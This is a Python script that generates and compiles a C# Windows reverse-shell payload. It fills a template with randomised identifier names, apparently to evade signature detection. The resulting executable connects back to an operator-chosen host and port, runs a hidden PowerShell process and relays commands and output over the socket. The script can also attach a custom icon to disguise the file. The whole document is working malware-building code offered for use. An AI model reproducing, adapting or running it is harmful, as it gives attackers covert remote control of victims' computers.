from operator import ge
import random
import string
import os
letters=[]
def random_letter():
	letter = ""
	for i in range(5):			
		letter += random.choice(string.ascii_letters)
	letters.append(letter)
for i in range(15):
    random_letter()
def compile(file):
	print(f"\n{'='*36} RESULT {'='*36}\n")
	os.system(f"mcs {file}")
	print(f"Complied file in tmp/client.exe")
	os.remove(file)
	iconc = input("would you like to add icon? (y/n) :>").lower()
	if iconc == "y":
		#does not support on mac yet
		icon = f"wine rcedit.exe --set-icon icon/icon.ico tmp/client.exe"
		os.system(icon)
		print("{+} work in progress {+}")	
def generate(host,port):
	data = '''using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace PowerLoader
{
	public class Program
	{
		static StreamWriter '''+letters[3] +''';
		static string '''+letters[1] +''' = "'''+host +'''";
		static int '''+letters[2] +''' = '''+port +''';
		static StreamReader '''+letters[5] +''';
		static Stream '''+letters[4] +''';
		public static void Main(string[] args)
		{

			'''+letters[6] +'''();
		}
		public static string Base64Decode(string base64EncodedData)
		{
			var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
			return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
		}

		public static void '''+letters[6] +'''()
		{
			
			TcpClient '''+letters[9] +''' = new TcpClient();
			while (true)
			{
                try
                {
					'''+letters[9] +'''.Connect('''+letters[1] +''', '''+letters[2] +''');
                    if ('''+letters[9] +'''.Connected) { '''+letters[8] +'''('''+letters[9] +'''); }
                    else
                    {
						Thread.Sleep(30000);
					}
					
				}
				catch (Exception ex)
                {
					Console.WriteLine(ex.ToString());	
                }
				
			}
		}
        private static void '''+letters[8] +'''(TcpClient _client)
		{
			Console.WriteLine("Got a Connection ! ");
			Process '''+letters[10] +''' = new Process();
			try
            {
				using ('''+letters[4] +''' = _client.GetStream())
				{
					using ('''+letters[5] +''' = new StreamReader('''+letters[4] +'''))
					{
						'''+letters[3] +''' = new StreamWriter('''+letters[4] +''');

						StringBuilder strIn = new StringBuilder();

						
						'''+letters[10] +'''.StartInfo.FileName = "powershell.exe";
						'''+letters[10] +'''.StartInfo.CreateNoWindow = true;
						'''+letters[10] +'''.StartInfo.UseShellExecute = false;
						'''+letters[10] +'''.StartInfo.RedirectStandardOutput = true;
						'''+letters[10] +'''.StartInfo.RedirectStandardInput = true;
						'''+letters[10] +'''.StartInfo.RedirectStandardError = true;
						'''+letters[10] +'''.OutputDataReceived += new DataReceivedEventHandler('''+letters[11] +''');
						'''+letters[10] +'''.Start();
						'''+letters[10] +'''.BeginOutputReadLine();
						
						while (true)
						{
							strIn.Append('''+letters[5] +'''.ReadLine()+"'''+r"\n" +'''");
							'''+letters[10] +'''.StandardInput.WriteLine(strIn);
							strIn.Remove(0, strIn.Length);
							
						}
					}
				}
			}
			catch (Exception ex)
            {
				if ('''+letters[10] +'''.HasExited)
				{
					Console.WriteLine($"Procees {'''+letters[10] +'''.Id} Exited");
					
				}
				'''+letters[10] +'''.Dispose();
				'''+letters[10] +'''.Close();
				'''+letters[7] +'''(_client);
				
			}

			
		}
		public static void '''+letters[7] +'''(TcpClient _client)
		{
			Console.WriteLine("Cleaning Up Server!");
			_client.Client.Dispose();
			_client.Client.Disconnect(true);
			_client.Client.Close();
			'''+letters[4] +'''.Close();
			'''+letters[3] +'''.Close();
			Console.WriteLine("Closed All Connections!");
			'''+letters[6] +'''();
		}

		public static void '''+letters[11] +'''(object sendingProcesss, DataReceivedEventArgs outdata)
		{
			StringBuilder strings = new StringBuilder();

			if (!String.IsNullOrEmpty(outdata.Data))
			{
				try
				{
					strings.Append(outdata.Data);
					'''+letters[3] +'''.Write(strings+"'''+r"\n" +'''");
					'''+letters[3] +'''.Flush();
				}
				catch (Exception err) {
					Console.WriteLine(err.ToString());
					
					'''+letters[6] +'''();
				}
			}
		}
	}
}'''
	return data
def main():
	while True:
		host =  input("Enter Local Host :) ")
		port =  input("Enter Local Port :) ")
		if len(host) < 0:
			print("Please Enter A Local Host")
		elif len(port) < 0:
			print("Please Enter A Local Port")
		data = generate(host,port)
		file_loc = "tmp/client.cs"
		with open(file_loc,'w') as file:
			file.write(data)
		file.close()
		compile(file_loc)
		print("Finished with Creating The Payload !")
		break
main()